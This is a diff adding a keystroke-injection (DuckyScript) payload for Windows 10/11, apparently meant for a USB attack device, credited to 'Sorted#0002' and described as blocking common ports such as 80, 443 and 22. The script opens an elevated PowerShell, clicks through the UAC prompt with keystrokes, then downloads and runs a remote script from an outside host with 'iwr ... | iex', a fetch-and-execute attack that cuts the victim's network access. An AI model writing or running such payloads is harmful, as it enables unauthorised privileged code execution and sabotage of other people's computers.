@@ -1,0 +1,21 @@
+REM Title: PORT RAPE
+REM Author: Sorted#0002
+REM OS: Windows 10/11
+REM Description: This Blocks most common ports like 80, 443, 22, 21, 8080
+
+
+DELAY 750
+WINDOWS d
+DELAY 850
+WINDOWS r
+DELAY 900
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 900
+ALT y
+DELAY 900
+STRING iwr https://sorted.is-broke.cf/portrape.ps1 -UseBasicParsing | iex; exit
+ENTER
